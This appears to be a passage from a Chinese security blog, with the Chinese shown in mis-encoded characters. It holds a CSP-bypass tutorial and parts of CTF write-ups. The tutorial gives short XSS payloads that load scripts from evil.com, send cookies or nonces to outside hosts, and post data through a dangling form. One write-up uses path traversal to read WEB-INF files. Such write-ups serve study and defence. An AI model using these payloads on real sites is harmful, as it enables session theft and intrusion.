    highlight_file(__FILE__);

/**
 * @Entity
 * @Table(name=&quot;user&quot;)
 */
class User
{
    /** 
     * @Id
     * @Column(type=&quot;integer&quot;)
     * @GeneratedValue
     */
    protected $uid;
    /** 
     * @Column(type=&quot;string&quot;) 
     * @unique
     */
    protected $username;
    /** 
     * @Column(type=&quot;string&quot;) 
     */
    protected $password;
    /** 
     * @Column(type=&quot;string&quot;) 
     */
    protected $role;

    public function __get($name)
    {
        if (property_exists(__CLASS__, $name)) {
            return $this-&gt;$name;
        } else {
            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
        }
    }
    public function __set($name, $value)
    {
        if (property_exists(__CLASS__, $name)) {
            $this-&gt;$name = $value;
        } else {
            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
        }
    }
}</code></pre>
<h2 id="å¸ƒå‰å²›"><a href="#å¸ƒå‰å²›" class="headerlink" title="å¸ƒå‰å²›"></a>å¸ƒå‰å²›</h2><p> <a href="http://183.129.189.60:10049/" target="_blank" rel="noopener">http://183.129.189.60:10049/</a> </p>
<p> <a href="http://183.129.189.60:10050/" target="_blank" rel="noopener">http://183.129.189.60:10050/</a> </p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/24/2020ç¬¬ä¸‰å±ŠBJDCTF/">http://blog.ccreater.top/2020/05/24/2020ç¬¬ä¸‰å±ŠBJDCTF/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" data-id="ckajv0tk5000008v0gudf486r" data-title="2020ç¬¬ä¸‰å±ŠBJDCTF" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass_csp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/20/bypass_csp/" class="article-date">
  <time class="dt-published" datetime="2020-05-20T14:05:20.880Z" itemprop="datePublished">2020-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/20/bypass_csp/">bypass_csp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>å†…å®¹å®‰å…¨ç­–ç•¥  (<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP" target="_blank" rel="noopener">CSP</a>) æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œç”¨äºæ£€æµ‹å¹¶å‰Šå¼±æŸäº›ç‰¹å®šç±»å‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬ (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS" target="_blank" rel="noopener">XSS</a>) å’Œæ•°æ®æ³¨å…¥æ”»å‡»ç­‰ã€‚æ— è®ºæ˜¯æ•°æ®ç›—å–ã€ç½‘ç«™å†…å®¹æ±¡æŸ“è¿˜æ˜¯æ•£å‘æ¶æ„è½¯ä»¶ï¼Œè¿™äº›æ”»å‡»éƒ½æ˜¯ä¸»è¦çš„æ‰‹æ®µã€‚ </p>
<h2 id="cspè¯­æ³•"><a href="#cspè¯­æ³•" class="headerlink" title="cspè¯­æ³•"></a>cspè¯­æ³•</h2><p>CSPçš„ç‰¹ç‚¹å°±æ˜¯ä»–æ˜¯åœ¨æµè§ˆå™¨å±‚é¢åšçš„é˜²æŠ¤ï¼Œæ˜¯å’ŒåŒæºç­–ç•¥åŒä¸€çº§åˆ«ï¼Œé™¤éæµè§ˆå™¨æœ¬èº«å‡ºç°æ¼æ´ï¼Œå¦åˆ™ä¸å¯èƒ½ä»æœºåˆ¶ä¸Šç»•è¿‡ã€‚</p>
<p>CSPåªå…è®¸è¢«è®¤å¯çš„JSå—ã€JSæ–‡ä»¶ã€CSSç­‰è§£æï¼Œåªå…è®¸å‘æŒ‡å®šçš„åŸŸå‘èµ·è¯·æ±‚ã€‚</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> :åœ¨å…¶ä»–èµ„æºç±»å‹æ²¡æœ‰ç¬¦åˆè‡ªå·±çš„ç­–ç•¥æ—¶åº”ç”¨è¯¥ç­–ç•¥(æœ‰å…³å®Œæ•´åˆ—è¡¨æŸ¥çœ‹<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> )</p>
<p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p>
<p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p>
<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p>
<p>script-src ä¸­ strict-dynamic ä¸­çš„ä½œç”¨:</p>
<ul>
<li>ä¸¢å¼ƒç™½åå•</li>
<li>å…è®¸æ‰§è¡Œjsç”Ÿæˆçš„jsä»£ç ï¼Œä¾‹å¦‚ï¼šdocument.createElement(â€˜scriptâ€™) </li>
<li>ä½¿  nonce-only CSPs  å¯ä»¥å·¥ä½œ</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p>
<h3 id="ä¸€äº›æ³¨æ„ç‚¹"><a href="#ä¸€äº›æ³¨æ„ç‚¹" class="headerlink" title="ä¸€äº›æ³¨æ„ç‚¹"></a>ä¸€äº›æ³¨æ„ç‚¹</h3><p><code>https://cdn.com/*</code>åªèƒ½åŒ¹é…<code>https://cdn.com/*</code></p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡"><a href="#cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡" class="headerlink" title="cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡"></a>cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡</h3><h3 id="åˆ©ç”¨302è·³è½¬"><a href="#åˆ©ç”¨302è·³è½¬" class="headerlink" title="åˆ©ç”¨302è·³è½¬"></a>åˆ©ç”¨302è·³è½¬</h3><p><code>Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p>
<p>å¦‚æœå¯ä¿¡åŸŸå†…å­˜åœ¨ä¸€ä¸ªå¯æ§çš„é‡å®šå‘æ–‡ä»¶ï¼Œé‚£ä¹ˆCSPçš„ç›®å½•é™åˆ¶å°±å¯ä»¥è¢«ç»•è¿‡ã€‚ </p>
<p>å‡è®¾staticç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ª302æ–‡ä»¶</p>
<pre><code>Static/302.php

&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</code></pre><p>åƒåˆšæ‰ä¸€æ ·ï¼Œä¸Šä¼ ä¸€ä¸ªtest.jpg ç„¶åé€šè¿‡302.phpè·³è½¬åˆ°uploadç›®å½•åŠ è½½jså°±å¯ä»¥æˆåŠŸæ‰§è¡Œ</p>
<pre><code>&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</code></pre><h3 id="ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks"><a href="#ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks" class="headerlink" title="ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks"></a>ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
<pre><code class="html">&lt;link rel=&quot;prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; (H5é¢„åŠ è½½)(only chrome)
&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; ï¼ˆDNSé¢„åŠ è½½ï¼‰
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;http://lorexxar.cn?c=[cookie]&quot;&gt;</code></pre>
<h3 id="åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡"><a href="#åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡" class="headerlink" title="åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡"></a>åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡</h3><p>å¾ˆå¤šç½‘ç«™éƒ½ä¼šå°†google,baiduâ€¦â€¦æ·»åŠ åˆ°å¯ä¿¡åŸŸé‡Œé¢ï¼Œè€Œå¦‚æœé‡Œé¢å­˜åœ¨å¯æ§çš„è¾“å‡ºæˆ‘ä»¬ä¾¿å¯ä»¥ç»•è¿‡csp</p>
<p>å¸¸ç”¨å¯æ§jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
<h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="åˆ©ç”¨-lt-base-gt-æ ‡ç­¾"><a href="#åˆ©ç”¨-lt-base-gt-æ ‡ç­¾" class="headerlink" title="åˆ©ç”¨&lt;base&gt;æ ‡ç­¾"></a>åˆ©ç”¨<code>&lt;base&gt;</code>æ ‡ç­¾</h4><p>Specify a default URL and a default target for all links on a page:</p>
<pre><code class="html">&lt;head&gt;
  &lt;base href=&quot;https://www.evil.com/&quot; target=&quot;_blank&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;img src=&quot;images/stickman.gif&quot; width=&quot;24&quot; height=&quot;39&quot; alt=&quot;Stickman&quot;&gt;&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;
&lt;a href=&quot;tags/tag_base.asp&quot;&gt;HTML base Tag&lt;/a&gt;
&lt;/body&gt;&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</code></pre>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸ª<code>&lt;base&gt;</code>æ ‡ç­¾ï¼Œå°†ç›¸å¯¹è·¯å¾„å¯¼å‘æ¶æ„çš„ç½‘ç«™</p>
<pre><code class="html">&lt;!-- XSS --&gt;
&lt;base href=&quot;https://evil.com/&quot;&gt;
&lt;!-- End XSS --&gt;
â€¦
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p><a href="https://evil.com/foo/bar.js" target="_blank" rel="noopener">https://evil.com/foo/bar.js</a></p>
<pre><code>alert(0000);</code></pre><p>æˆåŠŸæ‰§è¡Œ</p>
<p>é˜²å¾¡æ–¹å¼ï¼š</p>
<p>åœ¨cspä¸­æ·»åŠ ï¼šbase-uri â€˜noneâ€™ æˆ– base-uri â€˜selfâ€™</p>
<h4 id="åˆ©ç”¨chrome-bug-æ¥ä¿®æ”¹script-srcçš„å€¼"><a href="#åˆ©ç”¨chrome-bug-æ¥ä¿®æ”¹script-srcçš„å€¼" class="headerlink" title="åˆ©ç”¨chrome bug æ¥ä¿®æ”¹script srcçš„å€¼"></a>åˆ©ç”¨chrome bug æ¥ä¿®æ”¹script srcçš„å€¼</h4><pre><code class="html">&lt;!-- XSS --&gt;
&lt;svg&gt;&lt;set href=&quot;victim&quot; attributeName=&quot;href&quot; to=&quot;data:,alert(1)&quot; /&gt;
&lt;!-- End XSS --&gt;
â€¦
&lt;script id=&quot;victim&quot; src=&quot;foo.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p>SVGä¸­çš„setæ ‡ç­¾å¯ä»¥ä¿®æ”¹å…¶ä»–æ ‡ç­¾çš„å±æ€§å€¼</p>
<p>è¯¥æ¼æ´åœ¨chrome58ä¸­ä¿®å¤</p>
<h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><pre><code class="html">&lt;!-- XSS --&gt;
&lt;style&gt;
script { display: block }
script[nonce^=&quot;a&quot;]:after { content: url(&quot;record?a&quot;) }
script[nonce^=&quot;b&quot;]:after { content: url(&quot;record?b&quot;) }
&lt;/style&gt;
&lt;!-- End XSS --&gt;
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p>å¯ä»¥è”åˆå…¶ä»–æ ‡ç­¾æ¥å‘å‡ºè¯·æ±‚ï¼Œå¦‚<code>&lt;a&gt;</code> â€¦</p>
<pre><code class="html">&lt;style&gt;script[nonce^=&quot;0&quot;]~a{background:url(&quot;http://y5pwcd.ceye.io/success&quot;)}&lt;/style&gt;</code></pre>
<p>ç›¸å…³çš„css è¯­æ³•</p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p>
<h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>ç ´ååŸæœ‰çš„ç»“æ„ï¼Œå°†scriptæ ‡ç­¾å˜æˆæ–‡æœ¬ï¼Œè¯±ä½¿ç”¨æˆ·ç‚¹å‡»</p>
<pre><code class="html">&lt;!-- XSS --&gt; &lt;form method=&quot;post&quot; action=&quot;//evil.com/form&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;click&quot;&gt;&lt;textarea name=&quot;nonce&quot;&gt;
&lt;!-- End XSS --&gt;
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>åˆ©ç”¨ä½ç‰ˆæœ¬JQueryç­‰jsæ¡†æ¶æ¼æ´æ¥ç»•è¿‡csp</p>
<h2 id="ç»•è¿‡å®ä¾‹"><a href="#ç»•è¿‡å®ä¾‹" class="headerlink" title="ç»•è¿‡å®ä¾‹"></a>ç»•è¿‡å®ä¾‹</h2><h2 id="ä¸€äº›å·¥å…·"><a href="#ä¸€äº›å·¥å…·" class="headerlink" title="ä¸€äº›å·¥å…·"></a>ä¸€äº›å·¥å…·</h2><p>æ£€æŸ¥csp: <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
<p>å¸¸ç”¨å¯æ§jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
<p><a href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa" target="_blank" rel="noopener">csp mitigator</a> :ä¸€ä¸ªcspè°ƒè¯•å·¥å…·</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPsâ€¦ You wonâ€™t guess what happened next!](<a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack" target="_blank" rel="noopener">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPsâ€¦ You wonâ€™t guess what happened next!.pdf) </p>
<p><a href="https://paper.seebug.org/423/" target="_blank" rel="noopener">å‰ç«¯é˜²å¾¡ä»å…¥é—¨åˆ°å¼ƒå‘â€“CSPå˜è¿</a></p>
<h2 id="æ”¶è—"><a href="#æ”¶è—" class="headerlink" title="æ”¶è—"></a>æ”¶è—</h2><p>Bypassing CSP script nonces via the browser cacheï¼š <a href="http://sebastian-lekies.de/csp/attacker.php" target="_blank" rel="noopener">http://sebastian-lekies.de/csp/attacker.php</a></p>
<p> <a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p>
<p> <a href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p>
<p> <a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense" target="_blank" rel="noopener">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p>
<p> <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/20/bypass_csp/">http://blog.ccreater.top/2020/05/20/bypass_csp/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/20/bypass_csp/" data-id="ckaff54sp000014v015vi8k40" data-title="bypass_csp" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-2020å¹´ç½‘é¼æ¯é’é¾™ç»„" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" class="article-date">
  <time class="dt-published" datetime="2020-05-12T02:26:13.216Z" itemprop="datePublished">2020-05-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/">2020å¹´ç½‘é¼æ¯é’é¾™ç»„</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„"><a href="#2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„" class="headerlink" title="2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„"></a>2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„</h2><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>æµ‹è¯•å‘ç°DownloadServletå­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´<br>è¯»å–web.xmlï¼Œç„¶åä¾æ¬¡è¯»å–å¯¹åº”çš„classæ–‡ä»¶<br> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</a> </p>
<p>web.xml</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;
  &lt;display-name&gt;file_in_java&lt;/display-name&gt;
  &lt;welcome-file-list&gt;
    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;
  &lt;/welcome-file-list&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
&lt;/web-app&gt;</code></pre>
<p> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</a></p>
<p> DownloadServlet</p>
<pre><code class="java">package cn.abc.servlet;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.URLEncoder;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class DownloadServlet
  extends HttpServlet
{
  private static final long serialVersionUID = 1L;

  protected void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    doPost(request, response);
  }

  protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String fileName = request.getParameter(&quot;filename&quot;);
    fileName = new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);
    System.out.println(&quot;filename=&quot; + fileName);
    if ((fileName != null) &amp;&amp; (fileName.toLowerCase().contains(&quot;flag&quot;)))
    {
      request.setAttribute(&quot;message&quot;, &quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&quot;);
      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);
      return;
    }
    String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);

    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);

    File file = new File(path + &quot;/&quot; + fileName);
    if (!file.exists())
    {
      request.setAttribute(&quot;message&quot;, &quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½!&quot;);
      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);
      return;
    }
    String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1);

    response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;));

    FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName);

    ServletOutputStream out = response.getOutputStream();

    byte[] buffer = new byte[&#39;?&#39;];
    int len = 0;
    while ((len = in.read(buffer)) &gt; 0) {
      out.write(buffer, 0, len);
    }
    in.close();

    out.close();
  }

  public String findFileSavePathByFileName(String filename, String saveRootPath)
  {
    int hashCode = filename.hashCode();
    int dir1 = hashCode &amp; 0xF;
    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;
    String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;
    File file = new File(dir);
    if (!file.exists()) {
      file.mkdirs();
    }
    return dir;
  }
}
</code></pre>
<p>UploadServlet</p>
<pre><code class="java">package cn.abc.servlet;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.util.List;
import java.util.UUID;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;

public class UploadServlet
  extends HttpServlet
{
  private static final long serialVersionUID = 1L;

  protected void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    doPost(request, response);
  }

  protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String savePath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);

    String tempPath = getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;);
    File tempFile = new File(tempPath);
    if (!tempFile.exists()) {
      tempFile.mkdir();
    }
    String message = &quot;&quot;;
    try
    {
      DiskFileItemFactory factory = new DiskFileItemFactory();

      factory.setSizeThreshold(102400);

      factory.setRepository(tempFile);

      ServletFileUpload upload = new ServletFileUpload(factory);

      upload.setProgressListener(new UploadServlet.1(this));

      upload.setHeaderEncoding(&quot;UTF-8&quot;);

      upload.setFileSizeMax(1048576L);

      upload.setSizeMax(10485760L);
      if (!ServletFileUpload.isMultipartContent(request)) {
        return;
      }
      List&lt;FileItem&gt; list = upload.parseRequest(request);
      for (FileItem fileItem : list) {
        if (fileItem.isFormField())
        {
          String name = fileItem.getFieldName();

          String str1 = fileItem.getString(&quot;UTF-8&quot;);
        }
        else
        {
          String filename = fileItem.getName();
